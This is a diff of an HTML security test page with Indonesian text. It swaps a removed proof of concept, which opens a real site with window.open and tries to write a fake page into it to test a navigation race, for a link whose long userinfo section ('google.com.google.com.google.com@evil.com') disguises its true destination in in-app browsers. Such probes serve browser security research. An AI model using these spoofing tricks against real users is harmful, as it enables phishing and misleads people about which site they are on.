@@ -2,41 +2,13 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>PoC - Window Opener Race Condition Test</title>
+  <title>WebView Spoof Test</title>
 </head>
 <body>
-  <h2>Test: Pending URL / Navigation Race</h2>
-  <p>Buka Console (F12) sebelum klik, lalu tunggu hasilnya.</p>
-
-  <button onclick="spoofFast()">Test Delay 1ms (cepat)</button>
-  <button onclick="spoofSlow()">Test Delay 5000ms (lambat)</button>
-
-  <script>
-    function spoofFast() {
-      var win = window.open('https://faizdevs.my.id');
-      setTimeout(function() {
-        try {
-          win.document.write('<h1>Halaman palsu tampil (delay 1ms)</h1>');
-          win.document.close();
-          console.log('[1ms] BERHASIL nulis — berarti belum commit ke faizdevs.my.id');
-        } catch(e) {
-          console.log('[1ms] DIBLOKIR:', e.message, '— sudah commit, cross-origin protection aktif');
-        }
-      }, 1);
-    }
-
-    function spoofSlow() {
-      var win = window.open('https://faizdevs.my.id');
-      setTimeout(function() {
-        try {
-          win.document.write('<h1>Halaman palsu tampil (delay 5000ms)</h1>');
-          win.document.close();
-          console.log('[5000ms] BERHASIL nulis — berarti masih belum commit ke faizdevs.my.id');
-        } catch(e) {
-          console.log('[5000ms] DIBLOKIR:', e.message, '— sudah commit, cross-origin protection aktif');
-        }
-      }, 5000);
-    }
-  </script>
+  <h2>Test URL Display di In-App Browser</h2>
+  <p>Link ini sengaja pakai userinfo panjang untuk test truncation.</p>
+  <a href="https://google.com.google.com.google.com@evil.com">
+    Klik link ini dari dalam app (bukan browser biasa)
+  </a>
 </body>
 </html>
